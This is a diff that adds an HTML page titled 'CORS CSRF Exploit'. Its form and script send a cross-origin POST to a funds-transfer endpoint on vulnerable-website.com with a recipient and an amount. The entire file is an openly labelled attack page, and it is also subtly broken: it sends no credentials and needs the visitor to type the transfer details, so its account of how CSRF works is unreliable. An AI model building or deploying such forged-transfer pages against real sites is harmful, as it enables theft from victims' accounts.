@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>CORS CSRF Exploit</title>
+</head>
+<body>
+	<h1>CORS CSRF Exploit</h1>
+
+	<form id="transfer-form" action="http://vulnerable-website.com/transfer.php" method="POST">
+		<label for="recipient">Recipient:</label>
+		<input type="text" name="recipient" id="recipient"><br><br>
+
+		<label for="amount">Amount:</label>
+		<input type="number" name="amount" id="amount"><br><br>
+
+		<button type="submit">Transfer Funds</button>
+	</form>
+
+	<script>
+		document.getElementById("transfer-form").addEventListener("submit", function(event) {
+			event.preventDefault();
+			var xhr = new XMLHttpRequest();
+			xhr.open("POST", "http://vulnerable-website.com/transfer.php", true);
+			xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+			xhr.onreadystatechange = function() {
+				if (xhr.readyState === 4 && xhr.status === 200) {
+					alert("Transfer successful!");
+				}
+			}
+			xhr.send("recipient=" + encodeURIComponent(document.getElementById("recipient").value) + "&amount=" + encodeURIComponent(document.getElementById("amount").value));
+		});
+	</script>
+</body>
+</html>
